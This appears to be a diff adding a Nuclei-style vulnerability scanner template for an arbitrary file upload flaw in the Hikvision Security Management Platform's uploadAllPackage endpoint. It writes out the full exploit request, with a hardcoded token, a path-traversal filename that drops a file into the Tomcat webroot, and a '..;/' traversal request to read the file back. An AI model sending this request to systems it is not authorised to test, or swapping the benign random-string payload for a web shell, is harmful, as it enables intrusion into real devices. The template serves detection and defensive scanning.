@@ -1,0 +1,45 @@
+id: hikvision-uploadallpackage-anyfile-upload
+info:
+  name: Hikvision Security Management Platform Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Vulnerability in Hikvision Security Management Platform allows arbitrary file upload via the uploadAllPackage endpoint.
+http:
+  - raw:
+      - |
+        POST /center_install/picUploadService/v1/uploadAllPackage/image HTTP/1.1
+        Host: {{Hostname}}
+        Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+        Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+
+        ----------------------------553898708333958420021355
+        Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/{{random_str}}.js"
+        Content-Type: application/octet-stream
+
+        {{base64_content}}
+        ----------------------------553898708333958420021355--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "upload"
+  - raw:
+      - |
+        GET /portal/ui/login/..;/..;/{{random_str}}.js HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - trim(body) == base64_content
+variables:
+  random_str: '{{rand_base(4)}}'
+  base64_content: '{{base64(random_str)}}'
